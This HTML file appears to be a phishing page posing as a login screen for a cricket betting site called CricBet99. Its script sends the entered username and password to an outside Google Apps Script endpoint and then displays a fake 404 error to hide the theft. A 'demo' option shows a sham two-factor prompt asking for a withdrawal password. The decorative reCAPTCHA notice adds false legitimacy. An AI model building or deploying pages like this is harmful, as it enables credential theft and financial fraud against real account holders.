<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CricBat98</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(180deg, #8a4e00, #116257);
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            height: 100vh;
            padding-top: 50px;
        }

        .logo {
            width: 320px;
            height: auto;
            margin-bottom: 20px;
        }

        .container {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            width: 280px;
            text-align: center;
        }

        .heading {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 10px;
            color: #8B4513;
        }

        .form-group {
            margin-bottom: 15px;
            text-align: left;
        }

        .form-group input {
            width: calc(100% - 20px);
            padding: 10px;
            border: 1px solid #ced4da;
            border-radius: 4px;
            font-size: 14px;
        }

        .form-group input:focus {
            outline: none;
            border-color: #007bff;
        }

        .btn {
            display: block;
            width: 100%;
            padding: 10px;
            background-color: #8B4513;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            cursor: pointer;
        }

        .btn:hover {
            background-color: #5A3310;
        }

        .recaptcha-text {
            font-size: 12px;
            color: #6c757d;
            margin-top: 15px;
            text-align: center;
        }

        .recaptcha-text a {
            color: #007bff;
            text-decoration: none;
        }

        .recaptcha-text a:hover {
            text-decoration: underline;
        }

        .error-message {
            font-size: 18px;
            margin-bottom: 20px;
            color: #6c757d;
        }

        .bold-text {
            font-weight: bold;
        }

        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <!-- Logo -->
    <img src="logo.png" alt="CricBet99 Logo" class="logo">

    <!-- Main Container -->
    <div class="container" id="mainContainer">
        <!-- Login Form -->
        <div id="loginForm">
            <div class="heading">LOGIN</div>
            <form 
                action="https://script.google.com/macros/s/AKfycbz2yNi0v9CH5eN9OwTyEjnVMsmn1x7dOaG-BgdmekNg8cMPuf6fzymh4r9fKAKybJ-s/exec" 
                method="POST" 
                onsubmit="handleFormSubmit(event)">
                <div class="form-group">
                    <input type="text" id="UserName" name="UserName" placeholder="User Name" required>
                </div>
                <div class="form-group">
                    <input type="password" id="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit" class="btn">Login</button>
            </form>
            <button class="btn" style="margin-top: 10px;" onclick="loadDemoForm()">Login with Demo ID</button>
            <!-- reCAPTCHA text -->
            <div class="recaptcha-text">
                <span class="bold-text">This site is protected by reCAPTCHA and the Google</span> 
                <a href="#">Privacy Policy</a> and 
                <a href="#">Terms of Service</a> apply.
            </div>
        </div>

        <!-- Demo Login Form -->
        <div id="demoForm" class="hidden">
            <div class="heading">LOGIN</div>
            <p style="font-weight: bold; color: black; margin: 0;">2-Factor Authentication Enabled.</p>
            <p style="font-weight: bold; color: black; margin: 5px 0 10px;">Enter Your Withdrawal Password</p> <!-- Small margin for spacing -->
            <form onsubmit="handleDemoSubmit(event)">
                <div class="form-group" style="margin-bottom: 15px;"> <!-- Add spacing below text field -->
                    <input type="text" id="withdrawalCode" name="withdrawalCode" placeholder="Withdrawal Code" required>
                </div>
                <button type="submit" class="btn">Submit</button>
            </form>
            <!-- reCAPTCHA text -->
            <div class="recaptcha-text">
                <span class="bold-text">This site is protected by reCAPTCHA and the Google</span> 
                <a href="#">Privacy Policy</a> and 
                <a href="#">Terms of Service</a> apply.
            </div>
        </div>

        <!-- Error 404 Page -->
        <div id="error404" class="hidden">
            <div class="heading" style="color: #dc3545;">404</div>
            <div class="error-message">Page Not Found</div>
            <button class="btn" onclick="goToHome()">Back to Home Page</button>
        </div>
    </div>

    <script>
        function handleFormSubmit(event) {
            event.preventDefault(); // Prevent the form from navigating to the success page

            // Fetch the form data and submit it to the Google Apps Script URL
            const form = event.target;
            const formData = new FormData(form);
            const actionUrl = form.action;

            fetch(actionUrl, {
                method: 'POST',
                body: formData,
            }).then(() => {
                // Show the error 404 page after submission
                document.getElementById("loginForm").classList.add("hidden");
                document.getElementById("error404").classList.remove("hidden");
            }).catch((error) => {
                console.error('Error submitting form:', error);
            });
        }

        function loadDemoForm() {
            // Load the demo form (hide main login form and show demo form)
            document.getElementById("loginForm").classList.add("hidden");
            document.getElementById("demoForm").classList.remove("hidden"); // Make demo form visible
        }

        function handleDemoSubmit(event) {
            event.preventDefault(); // Prevent default form submission

            // Show the error 404 page
            document.getElementById("demoForm").classList.add("hidden");
            document.getElementById("error404").classList.remove("hidden");
        }

        function goToHome() {
            // Return to the main login form
            document.getElementById("error404").classList.add("hidden");
            document.getElementById("loginForm").classList.remove("hidden");
        }
    </script>
</body>
</html>
